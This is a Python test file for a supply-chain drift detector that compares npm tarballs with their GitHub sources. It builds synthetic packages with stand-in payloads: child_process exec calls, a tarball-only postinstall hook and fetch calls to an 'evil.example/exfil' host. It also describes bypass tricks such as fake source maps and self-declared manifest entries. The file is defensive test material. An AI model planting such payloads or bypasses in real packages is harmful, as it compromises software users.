"""Adversarial corpus for backend.deps.drift — reproduces the bypass shapes
the Week 2 review found in the pre-PR-C drift design, plus the negative
controls a legitimate build must still pass cleanly.

Table-driven, synthetic trees built directly in `tmp_path`. No Semgrep: the
`CapabilityProfile`/`CapabilityEvidence` objects are constructed by hand, so
these tests exercise `compare_sources`'s classification and excuse-set logic
in isolation from the scanner. Case 7 (a payload required from an
install-time hook target) needs a real Semgrep scan to exercise reachability
end to end, so it lives in `tests/test_deps_incidents.py` instead
(`test_install_hook_target_requiring_a_test_payload_is_forced_shipped`).

## Mutation check (manual, recorded here rather than automated)

Two mutations were applied by hand to `backend/deps/drift.py` and each was
confirmed to flip exactly the test(s) it should, then reverted:

- Reverting the bundled-dependency excuse from `github_categories |
  own_categories` back to "all categories" (the devDependency bypass a
  review round caught mid-PR) flips
  `test_deps_drift.py::test_bundled_dependency_excuse_is_bounded_to_the_packages_own_categories`
  from pass to fail, and leaves every other test in this file and
  `test_deps_drift.py` passing — including case 1 here, which exercises the
  *invalid-map* path (an undeclared package), a separate check from the
  bundled excuse's breadth.
- Reverting `compare_sources` to skip the strong/weak diff for `matched`
  files entirely (the pre-PR-C behavior, where only `unexplained` files were
  ever diffed) flips case 3
  (`test_case_3_payload_appended_to_matched_file_novel_category_is_strong_signal`)
  and `test_deps_drift.py::test_matched_file_with_novel_category_is_strong_signal`
  from pass to fail.

Cases 1, 2, and 5 are guarded by the invalid-map and build-dir excuse checks,
which predate this mutation round; they were exercised directly by writing
and running each test against the code before its corresponding fix landed,
during PR C's own development.

A third mutation, added for PR D's external-build handling: removing the
`_is_generated_unverifiable` check from `compare_sources` entirely flips case
10 (`test_case_10_external_build_generated_files_are_generated_unverifiable`)
from `signal=False` to `signal=True` — the files fall through to the ordinary
`unexplained`/`unverifiable` path and become strong signals, since their
PROCESS category is genuinely absent from the GitHub scan. Cases 3 and 5
(matched-file and declared-build-dir bypasses, neither involving
`external_build_markers`) are unaffected by this mutation, confirming the new
check only ever *suppresses* signal for files that are both declared by the
manifest and backed by a real repo-root build marker — it never widens an
existing excuse.

A fourth mutation, applied and reverted during review of the same feature:
reading `_declared_manifest_paths`/`hook_node_files_from_package_json` from
`tarball_package_json` instead of `github_package_json` (i.e. checking the
tarball's own manifest against itself) flips cases 14 and 15
(`test_case_14_tarball_only_manifest_declaration_cannot_self_certify`,
`test_case_15_tarball_only_files_dir_cannot_self_certify`) from `signal=True`
to `signal=False` — an attacker's own `"main": "evil.js"` or
`"files": ["payload"]` declaration, with no corresponding GitHub-side
declaration, would otherwise self-certify past the check whenever the repo
happens to have any build marker at its root (common even for plain JS
repos with an unrelated Makefile). Case 10 is unaffected by this mutation
(its declaration is genuine on both sides), confirming the fix is specific to
the self-certification path rather than breaking the legitimate case.

Note that `_is_generated_unverifiable` deliberately has no declared-*directory*
excuse at all (only exact main/bin/exports/hook-target paths) — see case 16
(`test_case_16_declared_directory_is_not_excused_only_exact_paths_are`), which
documents this as an accepted trade-off rather than a bypass: esbuild's real
shape needs only exact paths, and a directory-level excuse would be far
broader than the exact-path one, so it isn't a "mutation that should flip a
test" here — it's scope that was never added.
"""

import json

import pytest

from backend.deps.drift import compare_sources
from backend.models.dependencies import CapabilityEvidence, CapabilityProfile
from backend.models.enums import CapabilityCategory, PathClass, SourceKind


def _profile(evidence=(), status="ok", **overrides):
    return CapabilityProfile(
        name="pkg",
        version="1.0.0",
        source_kind=SourceKind.NPM_TARBALL,
        evidence=list(evidence),
        status=status,
        **overrides,
    )


def _evidence(file, category, path_class=PathClass.SHIPPED):
    return CapabilityEvidence(
        category=category,
        rule_id="r",
        file=file,
        line=1,
        snippet="x",
        source_kind=SourceKind.NPM_TARBALL,
        path_class=path_class,
    )


def _fetched_dir(tmp_path, label):
    fetch_dir = tmp_path / label
    fetch_dir.mkdir(parents=True)
    (tmp_path / f"{label}.complete").touch()
    return fetch_dir


def test_case_1_fake_map_to_undeclared_node_modules_is_strong_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "evil.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "evil.js.map").write_text(
        json.dumps({"sources": ["../node_modules/not-a-real-dep/index.js"]})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "index.js").write_text("module.exports = {};")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg", "dependencies": {}}))

    tarball_profile = _profile([_evidence("evil.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.signal is True
    assert "evil.js" in report.signal_files


def test_case_2_fake_map_to_unrelated_real_file_is_strong_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "evil.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "evil.js.map").write_text(json.dumps({"sources": ["totally-unrelated.ts"]}))
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("evil.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.signal is True
    assert "evil.js" in report.signal_files


def test_case_3_payload_appended_to_matched_file_novel_category_is_strong_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "index.js").write_text(
        "module.exports = {}; require('child_process').exec('x');"
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
    (github_dir / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("index.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert report.matched == ["index.js"]
    assert report.signal is True
    assert report.signal_files == {"index.js": [CapabilityCategory.PROCESS]}


def test_case_4_payload_appended_to_matched_file_category_already_elsewhere_is_weak(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
    (tarball_dir / "index.js").write_text("require('child_process').exec('a');")
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
    (github_dir / "index.js").write_text("module.exports = {};")
    (github_dir / "build.js").write_text("require('child_process').exec('elsewhere');")

    tarball_profile = _profile([_evidence("index.js", CapabilityCategory.PROCESS)])
    github_profile = _profile([_evidence("build.js", CapabilityCategory.PROCESS)])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert set(report.matched) == {"index.js", "package.json"}
    assert report.signal is False
    assert report.relocated == [{"file": "index.js", "categories": [CapabilityCategory.PROCESS]}]


def test_case_5_novel_capability_in_declared_build_dir_is_strong_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "evil.js").write_text("require('child_process').exec('evil')")
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "dist/index.js", "scripts": {"build": "tsc"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src.ts").write_text("export {};")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "scripts": {"build": "tsc"}})
    )

    tarball_profile = _profile([_evidence("dist/evil.js", CapabilityCategory.PROCESS)])
    report = compare_sources("pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, _profile())
    assert "dist/evil.js" in report.explained_by_build
    assert report.signal is True
    assert "dist/evil.js" in report.signal_files


def test_case_6_tarball_only_postinstall_is_strong_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "scripts": {"postinstall": "node scripts/setup.js"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg", "scripts": {}}))

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.install_hooks_added == ["postinstall"]
    assert report.signal is True


@pytest.mark.skip(
    reason="case 7 (payload required from an install-time hook target) needs a real Semgrep "
    "scan to exercise reachability end to end — see "
    "test_deps_incidents.py::test_install_hook_target_requiring_a_test_payload_is_forced_shipped"
)
def test_case_7_payload_required_from_install_time_hook_target():
    pass


def test_case_8_legit_ts_build_with_valid_maps_has_no_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "dist").mkdir()
    (tarball_dir / "dist" / "index.js").write_text(
        "require('fs').readFileSync('x');\n//# sourceMappingURL=index.js.map"
    )
    (tarball_dir / "dist" / "index.js.map").write_text(json.dumps({"sources": ["../src/index.ts"]}))
    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "dist/index.js"}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))
    (github_dir / "src").mkdir()
    (github_dir / "src" / "index.ts").write_text(
        "export function f() { return require('fs').readFileSync('x'); }"
    )

    tarball_profile = _profile([_evidence("dist/index.js", CapabilityCategory.FILESYSTEM)])
    github_profile = _profile([_evidence("src/index.ts", CapabilityCategory.FILESYSTEM)])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.explained_by_sourcemap == ["dist/index.js"]
    assert report.signal is False
    assert report.relocated == []


def test_case_9_legit_bundle_with_declared_dependency_has_no_signal(tmp_path):
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "bundle.js").write_text("require('left-pad')('x', 5);")
    (tarball_dir / "bundle.js.map").write_text(
        json.dumps({"sources": ["../node_modules/left-pad/index.js", "../src/index.js"]})
    )
    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "bundle.js"}))

    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "src").mkdir()
    (github_dir / "src" / "index.js").write_text("module.exports = require('left-pad');")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "dependencies": {"left-pad": "^1.0.0"}})
    )

    report = compare_sources("pkg", "1.0.0", tarball_dir, _profile(), github_dir, _profile())
    assert report.bundled_dependency == ["bundle.js"]
    assert report.signal is False


def test_case_10_external_build_generated_files_are_generated_unverifiable(tmp_path):
    """esbuild-shaped: a Go+Makefile monorepo generates bin/esbuild and
    lib/main.js at publish time. They're declared by the *GitHub* repo's own
    manifest (not just the tarball's — the tarball copies it, as a real
    publish would) and the repo has a real build marker, so they're
    informational (generated_unverifiable), never a signal."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "lib").mkdir()
    (tarball_dir / "lib" / "main.js").write_text("require('child_process').spawn('x');")
    (tarball_dir / "bin").mkdir()
    (tarball_dir / "bin" / "esbuild").write_text(
        "#!/usr/bin/env node\nrequire('child_process').spawn('x');"
    )
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
    )

    tarball_profile = _profile(
        [
            _evidence("lib/main.js", CapabilityCategory.PROCESS),
            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
        ]
    )
    github_profile = _profile(external_build_markers=["Makefile", "go.mod"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert set(report.generated_unverifiable) == {"lib/main.js", "bin/esbuild"}
    assert report.signal is False
    assert report.signal_files == {}


def test_case_11_no_build_marker_means_no_free_pass(tmp_path):
    """Same shape as case 10, but the GitHub repo has no detected build
    marker — the generated files get no excuse and stay a strong signal."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "lib").mkdir()
    (tarball_dir / "lib" / "main.js").write_text("require('child_process').spawn('x');")
    (tarball_dir / "bin").mkdir()
    (tarball_dir / "bin" / "esbuild").write_text(
        "#!/usr/bin/env node\nrequire('child_process').spawn('x');"
    )
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "lib/main.js", "bin": {"esbuild": "bin/esbuild"}})
    )

    tarball_profile = _profile(
        [
            _evidence("lib/main.js", CapabilityCategory.PROCESS),
            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
        ]
    )
    github_profile = _profile()  # no external_build_markers
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.generated_unverifiable == []
    assert report.signal is True
    assert set(report.signal_files) == {"lib/main.js", "bin/esbuild"}


def test_case_12_undeclared_file_with_marker_present_still_signals(tmp_path):
    """A build marker being present doesn't excuse *every* file in the
    package — only ones the GitHub manifest actually declares. A stray
    evil.js alongside the (GitHub-declared) bin/esbuild still signals."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "bin").mkdir()
    (tarball_dir / "bin" / "esbuild").write_text("require('child_process').spawn('x');")
    (tarball_dir / "evil.js").write_text("require('child_process').spawn('evil');")
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "bin": {"esbuild": "bin/esbuild"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "bin": {"esbuild": "bin/esbuild"}})
    )

    tarball_profile = _profile(
        [
            _evidence("bin/esbuild", CapabilityCategory.PROCESS),
            _evidence("evil.js", CapabilityCategory.PROCESS),
        ]
    )
    github_profile = _profile(external_build_markers=["Makefile"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.generated_unverifiable == ["bin/esbuild"]
    assert report.signal is True
    assert "evil.js" in report.signal_files


def test_case_14_tarball_only_manifest_declaration_cannot_self_certify(tmp_path):
    """The bypass a review round caught: an attacker can't excuse their own
    payload by declaring it in the *tarball's* package.json alone — GitHub's
    own manifest doesn't declare it, so it stays a strong signal even though
    a (coincidental, common) build marker is present at the repo root."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "evil.js").write_text("fetch('https://evil.example/exfil');")
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "main": "evil.js", "bin": {"x": "evil.js"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    # GitHub's real manifest declares neither `main` nor `bin` at all.
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))

    tarball_profile = _profile([_evidence("evil.js", CapabilityCategory.NETWORK)])
    github_profile = _profile(external_build_markers=["Makefile"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.generated_unverifiable == []
    assert report.signal is True
    assert "evil.js" in report.signal_files


def test_case_15_tarball_only_files_dir_cannot_self_certify(tmp_path):
    """Same bypass shape via a declared build *directory* rather than a
    single file: the tarball declares "files": ["payload"], but GitHub's own
    manifest declares no such directory, so everything under payload/ stays
    unexplained and signals."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "payload").mkdir()
    (tarball_dir / "payload" / "evil.js").write_text("fetch('https://evil.example/exfil');")
    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "files": ["payload"]}))
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg"}))

    tarball_profile = _profile([_evidence("payload/evil.js", CapabilityCategory.NETWORK)])
    github_profile = _profile(external_build_markers=["Makefile"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.generated_unverifiable == []
    assert report.signal is True
    assert "payload/evil.js" in report.signal_files


def test_case_13_hook_target_file_counts_as_declared_even_without_main_or_bin(tmp_path):
    """esbuild's actual shape: `install.js` is named only by the `postinstall`
    script (`"node install.js"`), never by main/bin/files/exports — it must
    still count as "declared by the manifest" for the external-build excuse,
    or the exact case this feature was built for stays a false signal."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "install.js").write_text("require('child_process').spawn('x');")
    (tarball_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "scripts": {"postinstall": "node install.js"}})
    )
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(
        json.dumps({"name": "pkg", "scripts": {"postinstall": "node install.js"}})
    )

    tarball_profile = _profile([_evidence("install.js", CapabilityCategory.PROCESS)])
    github_profile = _profile(external_build_markers=["Makefile", "go.mod"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert report.generated_unverifiable == ["install.js"]
    assert report.signal is False


def test_case_16_declared_directory_is_not_excused_only_exact_paths_are(tmp_path):
    """Deliberate trade-off: `_is_generated_unverifiable` excuses only
    *exact* declared paths (main/bin/exports/hook targets), never a whole
    declared directory — unlike `_classify_build`. GitHub declaring
    "main": "lib/index.js" doesn't excuse an unrelated tarball-only
    lib/evil.js sitting in the same top-level directory, even with a real
    build marker present: esbuild's real shape (bin/esbuild, install.js,
    lib/main.js) is fully covered by exact paths, and a directory-level
    excuse would be far broader — any tarball-only file dropped into a
    package's declared main/files directory would get waved through on
    nothing more than "the repo has a build marker somewhere"."""
    tarball_dir = _fetched_dir(tmp_path, "tarball")
    (tarball_dir / "lib").mkdir()
    (tarball_dir / "lib" / "index.js").write_text("module.exports = {};")
    (tarball_dir / "lib" / "evil.js").write_text("fetch('https://evil.example/exfil');")
    (tarball_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "lib/index.js"}))
    github_dir = _fetched_dir(tmp_path, "github")
    (github_dir / "package.json").write_text(json.dumps({"name": "pkg", "main": "lib/index.js"}))
    (github_dir / "lib").mkdir()
    (github_dir / "lib" / "index.js").write_text("module.exports = {};")

    tarball_profile = _profile([_evidence("lib/evil.js", CapabilityCategory.NETWORK)])
    github_profile = _profile(external_build_markers=["Makefile"])
    report = compare_sources(
        "pkg", "1.0.0", tarball_dir, tarball_profile, github_dir, github_profile
    )
    assert "lib/index.js" in report.matched
    assert report.generated_unverifiable == []
    assert report.signal is True
    assert "lib/evil.js" in report.signal_files
